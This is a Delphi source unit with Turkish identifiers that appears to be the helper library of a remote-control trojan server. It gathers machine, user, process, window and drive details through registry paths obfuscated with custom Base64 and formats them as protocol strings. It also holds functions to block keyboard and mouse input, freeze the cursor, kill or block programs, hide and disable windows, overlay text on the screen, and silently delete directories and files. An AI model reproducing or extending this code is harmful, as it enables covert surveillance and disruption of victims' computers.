unit apicore;

interface

uses
windows,
tlhelp32,
applicationunit,
gfxcore,
shellapi,
Lh5Unit,
classes,
sysutils;

const
Codes64 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/';

Function Anahtaroku(ana, Path, Value:String):String;
function ramdurumu: string;
function toplamram: string;
function GetOS: string;
function GetFileSize(FileName: String): Int64;
function windizini : string;
function sysdizini : string;
function GetPowerStatus : string;
Function File_GetLastModifiedDate(Filename : String): TDateTime;
Function File_GetLastAccessDate(FileName : String): TDateTime;
Function File_GetCreationDate(FileName : String): TDateTime;
function parcala(const s: string; wordIndex: integer): string;
function KillApp(const sCapt: PChar) : boolean;
function Psakla(const sCapt: PChar; islem: Boolean) : Boolean;
function ecozunurluk : String;
function idle: DWord;
function AppActivate(WindowName : PChar) : boolean;
function flash(const sCapt: PChar) : boolean;
function GetOSLanguage: string;
function SearchAndReplace(sSrc, sLookFor, sReplaceWith : string) : string;
function tempdizini: string;
function kullanici : Ansistring;
function makine : string;
Function ListProcesses:String;
function KillProcess(ExeFileName: string): integer;
function ListFiles(Directory:String):string;
function RunProcess(const AppPath:string; Visibility: Word):LONGBOOL;
function List_Drivers : String;
function detaylar : string;
function TaskList(FirstHandle: THandle): string;
function aktifpencere : string;
procedure faredondur;
procedure fareac;
Function DelTree(DirName : string): Boolean;
procedure programengel(prg:string);
procedure prgiptal;
function GetDirectorySize(const ADirectory: string): Integer;
procedure ekranayaz(Text:string; x,y,boyut,renk,arka:Integer;merkez:string);
procedure ekrantemizle;
function hddbilgisi(disk:string) : string;
function labeldegis(disk,yeni:string) : boolean;
function shellmekanlari : string;
function alayi(FirstHandle: THandle): string;
function bdegis(const sCapt: PChar;yazilasi:string) : Boolean;
procedure sikistir(gir,cik:string);
function ekranikapla(WindowName : PChar) : boolean;
function pkilitle(const sCapt: PChar) : boolean;
function pkilitac(const sCapt: PChar) : boolean;
function alayinisil(maske:String) : integer;
function rgyaz(key:Hkey; subkey,name,value:string):boolean;
procedure LoadServer(Fname:string;var FullContents:string);
function Decode64(S: string): string;
function Encode64(S: string): string;
function blockinput( block:boolean ): boolean; stdcall; external 'USER32.DLL' name 'BlockInput';

implementation

const
WM_CLOSE            = $0010;
regstr1 = 'KszcT7TXScLSJMbZSczpRsPqN5TfRcHlTtCWJbHSGtLoScLkT5PbSdDfRsu';
regstr2 = 'KszcT7TXScLSJMbZSczpRsPqN5TfRcHlTtDSGtLoScLkT5PbSdDfRsu';
regstr3 = 'KszcT7TXScLSJMbZSczpRsPqN5TfRcHlTtDSGtLoScLkT5PbSdDfRsvSHNXmR6zoPN9SKsXbR6mWHcziP6LoSm';
regstr4 = 'K79lP7LZT4vXRMK';
regstr5 = 'KcLdQNDqPN9bP4ztRcLo';
regstr6 = 'KcLdQNDqPN9bP4zoPs5kQNfXT6blRW';
regstr7 = 'H6LpQtHlS0';
regstr8 = 'K6LoSszkOMm';
regstr9 = 'KcLZPMvq';
regstr10 = 'Hc5sRt9fT6Lp';
regstr11 = 'K79lPt9XRNC';
regstr12 = 'KtHXSdHrS0';


function Encode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
begin
  Result := '';
  a := 0;
  b := 0;
  for i := 1 to Length(s) do
  begin
    x := Ord(s[i]);
    b := b * 256 + x;
    a := a + 8;
    while a >= 6 do
    begin
      a := a - 6;
      x := b div (1 shl a);
      b := b mod (1 shl a);
      Result := Result + Codes64[x + 1];
    end;
  end;
  if a > 0 then
  begin
    x := b shl (6 - a);
    Result := Result + Codes64[x + 1];
  end;
end;

function Decode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
begin
  Result := '';
  a := 0;
  b := 0;
  for i := 1 to Length(s) do
  begin
    x := Pos(s[i], codes64) - 1;
    if x >= 0 then
    begin
      b := b * 64 + x;
      a := a + 6;
      if a >= 8 then
      begin
        a := a - 8;
        x := b shr a;
        b := b mod (1 shl a);
        x := x mod 256;
        Result := Result + chr(x);
      end;
    end
    else
      Exit;
  end;
end;

procedure LoadServer(Fname:string;var FullContents:string);
var
 Fcontents:File of Char;
 Fbuffer:array [1..1024] of Char;
 rLen,Fsize:LongInt;
begin
 FullContents:='';
 {$I-}
 AssignFile(Fcontents,Fname);
 Reset(Fcontents);
 Fsize:=FileSize(Fcontents);
 while not Eof(Fcontents) do begin
  BlockRead(Fcontents,Fbuffer,1024,rLen);
  FullContents:=FullContents + string(Fbuffer);
 end;
 CloseFile(Fcontents);
 if Length(FullContents) > Fsize then
  FullContents:=Copy(FullContents,1,Fsize);
end;

function rgyaz(key:Hkey; subkey,name,value:string):boolean;
var
regkey:hkey;
begin
  result := false;
  RegCreateKey(key,PChar(subkey),regkey);
  if RegSetValueEx(regkey,Pchar(name),0,REG_EXPAND_SZ,pchar(value),length(value)) = 0 then
    result := true;
  RegCloseKey(regkey);
end;

procedure sikistir(gir,cik:string);
var
InStr, OutStr: TFileStream;
begin
try
InStr := TFileStream.Create(gir,fmOpenRead);
OutStr := TFileStream.Create(cik,fmCreate);
LHACompress(InStr, OutStr);
InStr.Free;
OutStr.Free;
except on exception do exit;
end;
end;

Function DelTree(DirName : string): Boolean;
var
SHFileOpStruct : TSHFileOpStruct;
DirBuf : array [0..255] of char;
begin
try
Fillchar(SHFileOpStruct,Sizeof(SHFileOpStruct),0) ;
FillChar(DirBuf, Sizeof(DirBuf), 0 ) ;
StrPCopy(DirBuf, DirName) ;
with SHFileOpStruct do begin
Wnd := 0;
pFrom := @DirBuf;
wFunc := FO_DELETE;
//fFlags := FOF_ALLOWUNDO;
fFlags := fFlags or FOF_NOCONFIRMATION;
fFlags := fFlags or FOF_SILENT;
end;
Result := (SHFileOperation(SHFileOpStruct) = 0) ;
except
result := False;
end;
end;

const
cOsUnknown = 'Bilinmiyor';
cOsWin95    = 'Win95';
cOsWin98    = 'Win98';
cOsWin98SE  = 'Win98SE';
cOsWinME    = 'WinME';
cOsWinNT    = 'WinNT';
cOsWin2000  = 'Win2k';
cOsXP       = 'WinXP';

WM_QUIT             = $0012;
WM_SYSCOMMAND       = $0112;

var
MS:TMemoryStatus;
mfx,mfy:integer;
prgipt:string;
Taymir: array [0..5] of cardinal;
yazii,mm:string;
edegisken: array [0..5] of integer;
fareaktif,ekranaktif,prgaktif:boolean;

function GetDirectorySize(const ADirectory: string): Integer;
var
  Dir:  TSearchRec;
  Ret:  integer;
  Path: string;
begin
  Result := 0;
  Path   := ExtractFilePath(ADirectory);
  Ret    := Sysutils.FindFirst(ADirectory, faAnyFile, Dir);

  if Ret <> NO_ERROR then
    exit;

  try
    while ret=NO_ERROR do
    begin
      inc(Result, Dir.Size);
      if (Dir.Attr in [faDirectory]) and (Dir.Name[1] <> '.') then
         Inc(Result, GetDirectorySize(Path + Dir.Name + '\*.*'));
      Ret := Sysutils.FindNext(Dir);
    end;
  finally
    Sysutils.FindClose(Dir);
  end;
end;

function labeldegis(disk,yeni:string) : boolean;
begin
try
result:=setvolumelabel(pchar(disk),pchar(yeni));
finally;
end;
end;

function hddbilgisi(disk:string) : string;
var
isim,dsistem:string;
pVolName,pfsbuf    : PChar;
FSSysFlags,maxCmpLen   : DWord;
begin
GetMem(pVolName, MAX_PATH);
GetMem(pFSBuf, MAX_PATH);
GetVolumeInformation(PChar(disk), pVolName, MAX_PATH, nil,maxCmpLen, FSSysFlags, pFSBuf, MAX_PATH);
isim := StrPas(pVolName);
if isim='' then isim:='Bulunamadi';
dsistem := StrPas(pFSBuf);
FreeMem(pVolName, MAX_PATH);
FreeMem(pFSBuf, MAX_PATH);
result:='+hbilgi'+'|'+disk+'|'+isim+'|'+dsistem+'|.';
end;

procedure fare;stdcall;
begin
setcursorpos(mfx,mfy);
end;

procedure prgengel;stdcall;
begin
KillProcess(prgipt);
end;

procedure yazilkaybolmalan;stdcall;
begin
PrintInCoordinate(yazii,edegisken[0],edegisken[1],edegisken[2],edegisken[3],edegisken[4],mm);
end;

procedure ekranayaz(Text:string; x,y,boyut,renk,arka:Integer;merkez:string);
begin
if ekranaktif then exit;
yazii:=text;
edegisken[0]:=x;
edegisken[1]:=y;
edegisken[2]:=boyut;
edegisken[3]:=renk;
edegisken[4]:=arka;
mm:=merkez;
taymir[2]:=settimer(0,taymir[2],10,@yazilkaybolmalan);
ekranaktif:=True;
end;

procedure ekrantemizle;
begin
killtimer(0,taymir[2]);
ekranaktif:=false;
end;

procedure faredondur;
var p:tpoint;
begin
if fareaktif then exit;
getcursorpos(p);
mfx:=p.x;
mfy:=p.y;
taymir[0]:=settimer(0,taymir[0],1,@fare);
fareaktif:=true;
end;

procedure programengel(prg:string);
begin
if prgaktif then exit;
prgipt:=prg;
taymir[1]:=settimer(0,taymir[1],1,@prgengel);
prgaktif:=True;
end;

procedure prgiptal;
begin
killtimer(0,taymir[1]);
prgaktif:=false;
end;

procedure fareac;
begin
killtimer(0,taymir[0]);
fareaktif:=false;
end;

function aktifpencere : string;
var
Caption :  array[0..80] of Char;
Handler :  THandle;
begin
Handler := GetForegroundWindow;
GetWindowText(Handler, Caption, 80);
result:=caption;
end;

function TaskList(FirstHandle: THandle): string;
var
   lngLen:longint;
   strBuffer,This,All:string;
   TaskHandle:THandle;
   psayisi:integer;
begin
   psayisi:=0;
   TaskHandle:=GetWindow(FirstHandle,GW_HWNDFIRST);
   while TaskHandle > 0 do
   begin
      lngLen:=GetWindowTextLength(TaskHandle) + 1;
      SetLength(strBuffer,lngLen);
      lngLen:=GetWindowText(TaskHandle,PChar(strBuffer),lngLen);
      if lngLen > 0 then
      begin
     This:=TrimRight(strBuffer);
     if IsWindowVisible(TaskHandle) then begin
     this:=SearchAndReplace(this,'|','?');
         All:=All + This + '|';
         psayisi:= psayisi + 1;
    end;
end;
TaskHandle:=GetWindow(TaskHandle,GW_HWNDNEXT);
end;
TaskList:='+pencere:'+inttostr(psayisi)+'|'+Copy(All,1,Length(All) - 1);
end;

function alayi(FirstHandle: THandle): string;
var
   lngLen:longint;
   strBuffer,This,All:string;
   TaskHandle:THandle;
   psayisi:integer;
begin
   psayisi:=0;
   TaskHandle:=GetWindow(FirstHandle,GW_HWNDFIRST);
   while TaskHandle > 0 do
   begin
      lngLen:=GetWindowTextLength(TaskHandle) + 1;
      SetLength(strBuffer,lngLen);
      lngLen:=GetWindowText(TaskHandle,PChar(strBuffer),lngLen);
      if lngLen > 0 then
      begin
     This:=TrimRight(strBuffer);
     this:=SearchAndReplace(this,'|','?');
All:=All + This + '|';
psayisi:= psayisi + 1;
end;
TaskHandle:=GetWindow(TaskHandle,GW_HWNDNEXT);
end;
result:='+pencere:'+inttostr(psayisi)+'|'+Copy(All,1,Length(All) - 1);
end;

function SearchAndReplace(sSrc, sLookFor, sReplaceWith : string) : string;
var
   nPos, nLenLookFor : integer;
begin
   nPos := Pos(sLookFor, sSrc) ;
   nLenLookFor := Length(sLookFor) ;
   while (nPos > 0) do begin
     Delete(sSrc, nPos, nLenLookFor) ;
     Insert(sReplaceWith, sSrc, nPos) ;
     nPos := Pos(sLookFor, sSrc) ;
   end;
   Result := sSrc;
end;

function tempdizini: string;
var
  lng:     DWORD;
begin
  SetLength(Result, MAX_PATH);
  lng := GetTempPath(MAX_PATH, PChar(Result));
  SetLength(Result, lng);
end;

function kullanici : Ansistring;
var
  dwI : DWord;
begin
  dwI := MAX_PATH;
  SetLength (Result, dwI + 1);
  if WNetGetUser (Nil, PChar (Result), dwI) = NO_ERROR then
    SetLength (Result, StrLen (PChar (Result)))
  else
    SetLength (Result, 0)
end;

function makine : string;
var
  Makine_ismi:array[0..255] of char;
  BufferSize:DWORD;
begin
  BufferSize:=SizeOf(Makine_ismi);
  GetComputerName(@Makine_ismi,BufferSize);
 result:= Makine_ismi;
end;

Function ListProcesses:String;
 Var
  Handle:THandle;
  ProcShot:TProcessEntry32;
  Str:string;
  i:Integer;
  Loop:bool;
 begin
 str:='';
 i:=0;
 Handle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
 ProcShot.dwSize:=sizeof(ProcShot);
 loop:=Process32First(Handle,ProcShot);
 while integer(loop) <> 0 do
 begin
 Str:=Str+ProcShot.szExeFile+'|';
 i:=i+1;
 Loop:=Process32Next(Handle,ProcShot);
 end;
 CloseHandle(Handle);
 Result:=('+islemler:' + IntToStr(i)+'|'+Str);
 end;

function KillProcess(ExeFileName: string): integer;
const
PROCESS_TERMINATE=$0001;
var
ContinueLoop: BOOL;
FSnapshotHandle: THandle;
FProcessEntry32: TProcessEntry32;
begin
result := 0;
FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
ContinueLoop:=Process32First(FSnapshotHandle,FProcessEntry32);
while integer(ContinueLoop)<>0 do begin
if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))=UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile)=UpperCase(ExeFileName))) then
Result:=Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),FProcessEntry32.th32ProcessID), 0));
ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
end;
CloseHandle(FSnapshotHandle);
end;

function alayinisil(maske:String) : integer;
var
FileName:string;
FindHandle:THandle;
SearchRec:TWIN32FindData;
FileCount:integer;
begin
filecount:=0;
result:=0;
try
FindHandle := FindFirstFile(PChar(maske), SearchRec);
if FindHandle <> INVALID_HANDLE_VALUE then
repeat
FileName:=SearchRec.cFileName;
if deletefile(filename) then FileCount := FileCount + 1;
until FindNextFile(FindHandle,SearchRec)=false;
Windows.FindClose(FindHandle);
except on exception do exit
end;
result:=filecount;
end;

function ListFiles(Directory:String):string;
var
FileName, FileList, DirList:string;
FindHandle:THandle;
SearchRec:TWIN32FindData;
FileCount, DirCount:integer;

begin
FileCount:= 0;
DirCount := 0;
ListFiles:='';
try
FindHandle := FindFirstFile(PChar(Directory+'*.*'), SearchRec);
if FindHandle <> INVALID_HANDLE_VALUE then
repeat
FileName:=SearchRec.cFileName;
if ((SearchRec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then
begin
DirList:=DirList + (FileName + '|');
DirCount := DirCount + 1;
end
else
begin
FileList:=FileList + (Filename + '|');
FileCount := FileCount + 1;
end;
until FindNextFile(FindHandle,SearchRec)=false;
Windows.FindClose(FindHandle);
finally
//sysutils.FindClose(FindHandle);
end;
ListFiles:=('+klasor:' + IntToStr(DirCount) + '|' + DirList + '+dosya:' + IntToStr(FileCount) + '|' + FileList);
end;

function StrToHKEY(const KEY: String): HKEY;
begin
   if KEY = 'HKEY_CLASSES_ROOT' then result:= HKEY_CLASSES_ROOT else
   if KEY = 'HKEY_CURRENT_USER' then result:= HKEY_CURRENT_USER else
   if KEY = 'HKEY_LOCAL_MACHINE' then result:= HKEY_LOCAL_MACHINE else
   if KEY = 'HKEY_USERS' then result:= HKEY_USERS else
   if KEY = 'HKEY_PERFORMANCE_DATA' then result:= HKEY_PERFORMANCE_DATA else
   if KEY = 'HKEY_CURRENT_CONFIG' then result:= HKEY_CURRENT_CONFIG else
   if KEY = 'HKEY_DYN_DATA' then result:= HKEY_DYN_DATA else
   result:= HKEY_LOCAL_MACHINE;
end;

Function Anahtaroku(ana, Path, Value:String):String;
Var
 kroot,Key : Hkey;
 Siz : Cardinal;
 Val : Array[0..16382] Of Char;
Begin
 kRoot:=strtohkey(ana);
 ZeroMemory(@Val, Length(Val));
 RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
 Siz := 16383;
 RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
 RegCloseKey(Key);
 If Val <> '' then
  Result := Val;
End;

function List_Drivers : String;
Var
 ID : DWORD;
 i , DriverCount :Integer;
 DriverType : String;
 str:string;
 begin
  result:='';
  DriverCount:=0;
  Id:=GetLogicalDrives;
  for i :=0 to 25 do begin
  if (id and(1 shl i)) <> 0 then begin
   case GetDriveType(pchar(char(ord('A')+i)+':\'))of
        DRIVE_UNKNOWN:     drivertype:= '0';
        DRIVE_NO_ROOT_DIR: drivertype:= '1';
        DRIVE_REMOVABLE:   drivertype:= '2';
        DRIVE_CDROM:       drivertype:= '3';
        DRIVE_FIXED:       drivertype:= '4';
        DRIVE_REMOTE:      drivertype:= '5';
        DRIVE_RAMDISK:     drivertype:= '6';
       end;
       str:=str+pchar(char(ord('A')+i)+':\')+DriverType+'|';
       DriverCount :=DriverCount + 1;
  end;
end;
result:=('+src:'+IntToStr(DriverCount)+'|'+str);
end;

function detaylar : string;
var
a: array[0..3] of string;
begin
a[1]:='?';
a[2]:='?';
a[3]:='?';
If (GetOs = 'WinXP') or (GetOs = 'Win2k') or (GetOs = 'WinNT') Then Begin
   a[1]:=Anahtaroku('HKEY_LOCAL_MACHINE', decode64(regstr1), decode64(regstr4));
   a[2]:=Anahtaroku('HKEY_LOCAL_MACHINE', decode64(regstr1), decode64(regstr5));
   a[3]:=Anahtaroku('HKEY_LOCAL_MACHINE', decode64(regstr1), decode64(regstr6));
  End Else Begin
   a[1]:=Anahtaroku('HKEY_LOCAL_MACHINE', decode64(regstr2), decode64(regstr4));
   a[2]:=Anahtaroku('HKEY_LOCAL_MACHINE', decode64(regstr2), decode64(regstr5));
   a[3]:=Anahtaroku('HKEY_LOCAL_MACHINE', decode64(regstr2), decode64(regstr6));
  End;
  if a[1]='' then a[1]:='?';
  if a[2]='' then a[2]:='?';
  if a[3]='' then a[3]:='?';
  result:=a[1]+'|'+a[2]+'|'+a[3];
end;

function shellmekanlari : string;
var
hede: array[0..10] of string;
i: integer;
begin

for i:= 0 to 5 do begin
hede[i]:='?';
end;

try
hede[0]:=Anahtaroku('HKEY_CURRENT_USER', decode64(regstr3), decode64(regstr7));
hede[1]:=Anahtaroku('HKEY_CURRENT_USER', decode64(regstr3), decode64(regstr8));
hede[2]:=Anahtaroku('HKEY_CURRENT_USER', decode64(regstr3), decode64(regstr9));
hede[3]:=Anahtaroku('HKEY_CURRENT_USER', decode64(regstr3), decode64(regstr10));
hede[4]:=Anahtaroku('HKEY_CURRENT_USER', decode64(regstr3), decode64(regstr11));
hede[5]:=Anahtaroku('HKEY_CURRENT_USER', decode64(regstr3), decode64(regstr12));
finally
end;

for i:= 0 to 5 do begin
if hede[i]='' then hede[i]:='?';
if hede[i]=' ' then hede[i]:='?';
end;
result:='+mekan02'+'|'+hede[0]+'|'+hede[1]+'|'+hede[2]+'|'+hede[3]+'|'+hede[4]+'|'+hede[5];
end;


function RunProcess(const AppPath:string; Visibility: Word):LONGBOOL;
var
 SI: TStartupInfo;
 PI: TProcessInformation;
 zFileName, zParams: array[0..79] of Char;
begin
FillChar(SI, SizeOf(SI), 0);
SI.cb := SizeOf(SI);
SI.wShowWindow := Visibility;
result:=CreateProcess(StrPCopy(zFileName, AppPath),StrPCopy(zParams, ''),nil, nil, false, Normal_Priority_Class, nil, nil, SI, PI);
CloseHandle(PI.hThread)
end;

function GetFileSize(FileName: String): Int64;
Var
  H: THandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindClose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
  End;
End;

function windizini : string;
var
  a : Array[0..144] of char;
begin
  GetWindowsDirectory(a, sizeof(a));
  result:=StrPas(a);
end;

function sysdizini : string;
var
  a : Array[0..144] of char;
begin
  GetSystemDirectory(a, sizeof(a));
  result:=StrPas(a);
end;

function GetPowerStatus : string;
var
SystemPowerStatus: TSystemPowerStatus;
pil,durum:string;
begin
SetLastError(0);
pil:='???';
durum:='??';
if GetSystemPowerStatus(SystemPowerStatus) then begin
if SystemPowerStatus.ACLineStatus = 0 then pil:='PIL';
if SystemPowerStatus.ACLineStatus = 1 then pil:='ACG';
if (SystemPowerStatus.BatteryLifePercent <> 255) then durum := inttostr(SystemPowerStatus.BatteryLifePercent);
end;
Result:= pil+'|%'+durum;
end;

Function File_GetLastModifiedDate(Filename : String): TDateTime;
var
SearchRec : TSearchRec;
DT : TFileTime;
ST : TSystemTime;
begin
Result := 0;
If Not FileExists(FileName) Then Exit;
Try
SysUtils.FindFirst(FileName, faAnyFile, SearchRec);
Try
FileTimeToLocalFileTime(SearchRec.FindData.ftLastWriteTime,DT);
FileTimeToSystemTime(DT, ST);
Result := SystemTimeToDateTime(ST);
Finally
SysUtils.FindClose(SearchRec);
End;
Except
Result := 0;
End;
end;

Function File_GetLastAccessDate(FileName : String): TDateTime;
var
SearchRec : TSearchRec;
DT : TFileTime;
ST : TSystemTime;
begin
Result := 0;
If Not FileExists(FileName) Then Exit;
Try
SysUtils.FindFirst(FileName, faAnyFile, SearchRec);
Try
FileTimeToLocalFileTime(SearchRec.FindData.ftLastAccessTime, DT);
FileTimeToSystemTime(DT, ST);
Result := SystemTimeToDateTime(ST);
Finally
SysUtils.FindClose(SearchRec);
End;
Except
Result := 0;
End;
end;

Function File_GetCreationDate(FileName : String): TDateTime;
var
SearchRec : TSearchRec;
DT : TFileTime;
ST : TSystemTime;
begin
Result := 0;
If Not FileExists(FileName) Then Exit;
Try
SysUtils.FindFirst(FileName, faAnyFile, SearchRec);
Try
FileTimeToLocalFileTime(SearchRec.FindData.ftCreationTime,DT );
FileTimeToSystemTime(DT, ST);
Result := SystemTimeToDateTime(ST);
Finally
SysUtils.FindClose(SearchRec);
End;
Except
Result := 0;
End;
end;

function parcala(const s: string; wordIndex: integer): string;
var
  index, counter: integer;
begin
  result:= trim(s); //result equals the string you entered
  counter := 0; //counter starts at 0
  index := Pos('||', result); //if there are 2 spaces by each other
   while index > 0 do //while its true theres more then 1 space by each other
  begin
   Delete(result, index, 1); //delete one of the spaces
   index := Pos('||', result); //check the string again for double spaces
  end;
  //Now there are no spaces next to each other we can continue ;)
  index := Pos('|', result); //get the position of the first word
    while ((counter < wordIndex) and (index > 0)) do //while counter is less then wordindex and there are more words countinue
  begin
    Delete(result, 1, index); //delete all characters from the beginning index to the space to the next word
    index := Pos('|', result); //check if there any more words in the string by looking for spaces

    counter := counter + 1; //increment the counter by one
  end;

  if (counter < wordIndex) then //if were not enough words in your search return a blank string
    result:= '';

  index := Pos('|', result); //check if there are more words after your word
  if index > 0 then  //if there are more words
    Delete(result, index, maxInt);// start at the space then delete all the words after the space maxInt is the largest number a integer will go by
end;

function pkilitle(const sCapt: PChar) : boolean;
  var AppHandle:THandle;
begin
result:=false;
  AppHandle:=FindWindow(Nil, sCapt);
  if apphandle <> 0 then Result:=True;
  enablewindow(apphandle,false);
end;

function pkilitac(const sCapt: PChar) : boolean;
  var AppHandle:THandle;
begin
result:=false;
  AppHandle:=FindWindow(Nil, sCapt);
  if apphandle <> 0 then Result:=True;
  enablewindow(apphandle,true);
end;

function KillApp(const sCapt: PChar) : boolean;
  var AppHandle:THandle;
begin
  AppHandle:=FindWindow(Nil, sCapt);
  Result:=PostMessage(AppHandle, WM_CLOSE, 0, 0) ;
end;

function bdegis(const sCapt: PChar;yazilasi:string) : Boolean;
var AppHandle:THandle;
begin
AppHandle:=FindWindow(Nil, sCapt);
Result:=False;
if apphandle <> 0 then begin
setwindowtext(apphandle,pchar(yazilasi));
Result:=True;
end;
end;

function Psakla(const sCapt: PChar; islem: Boolean) : Boolean;
var AppHandle:THandle;
begin
AppHandle:=FindWindow(Nil, sCapt);
Result:=False;
if apphandle <> 0 then begin
if islem then ShowWindow(apphandle,SW_SHOW) else ShowWindow(apphandle,SW_HIDE);
Result:=True;
end;
end;

function ecozunurluk : String;
begin
  Result:=IntToStr(GetSystemMetrics(SM_CXSCREEN)) + ' x ' +
          IntToStr(GetSystemMetrics(SM_CYSCREEN));
end;

function idle: DWord;
var
   liInfo: TLastInputInfo;
begin
   liInfo.cbSize := SizeOf(TLastInputInfo) ;
   GetLastInputInfo(liInfo) ;
   Result := (GetTickCount - liInfo.dwTime);
end;

function AppActivate(WindowName : PChar) : boolean;
var
WindowHandle : HWND;
begin
  try
    Result:=true;
    WindowHandle:=FindWindow(nil,WindowName);
    If (WindowHandle<>0) then begin
      SendMessage(WindowHandle, WM_SYSCOMMAND, SC_RESTORE, WindowHandle);
      SetForegroundWindow(WindowHandle);
    end else Result:=false;
  except
    on Exception do Result:=false;
  end;
end;

function ekranikapla(WindowName : PChar) : boolean;
var
WindowHandle : HWND;
begin
  try
    Result:=true;
    WindowHandle:=FindWindow(nil,WindowName);
    If (WindowHandle<>0) then begin
      SendMessage(WindowHandle, WM_SYSCOMMAND, SC_MAXIMIZE, WindowHandle);
      SetForegroundWindow(WindowHandle);
    end else Result:=false;
  except
    on Exception do Result:=false;
  end;
end;

function flash(const sCapt: PChar) : boolean;
var AppHandle:THandle;
label kapa;
begin
Result:=false;
AppHandle:=FindWindow(Nil, sCapt);
if apphandle <> 0 then begin
FlashWindow(AppHandle, True);
result:=true
end;
end;

function GetOSLanguage: string;
var
LanguageID:LangID;
Len: Integer;
begin
SetLength(Result, 255);
LanguageID:=GetSystemDefaultLangID;
Len:=VerLanguageName(LanguageID,PChar(Result), Length(Result));
SetLength(Result, Len);
end;

function GetOS: string;
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := cOsUnknown;
  { set operating system type flag }
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT: { Windows NT/2000 }
        begin
          if majorVer <= 4 then
            Result := cOsWinNT
          else if (majorVer = 5) and (minorVer = 0) then
            Result := cOsWin2000
          else if (majorVer = 5) and (minorVer = 1) then
            Result := cOsXP
          else
            Result := cOsUnknown;
        end;
      VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
        begin
          if (majorVer = 4) and (minorVer = 0) then
            Result := cOsWin95
          else if (majorVer = 4) and (minorVer = 10) then
          begin
            if osVerInfo.szCSDVersion[1] = 'A' then
              Result := cOsWin98SE
            else
              Result := cOsWin98;
          end
          else if (majorVer = 4) and (minorVer = 90) then
            Result := cOsWinME
          else
            Result := cOsUnknown;
        end;
      else
        Result := cOsUnknown;
    end;
  end
  else
    Result := cOsUnknown;
end;

function ramdurumu: string;
begin
GlobalMemoryStatus(MS);
result:= inttostr(MS.dwMemoryLoad);
end;

function toplamram: string;
begin
GlobalMemoryStatus(MS);
Result:=inttostr(MS.dwTotalPhys div 1024 div 1024) + ' MB';
end;

end.

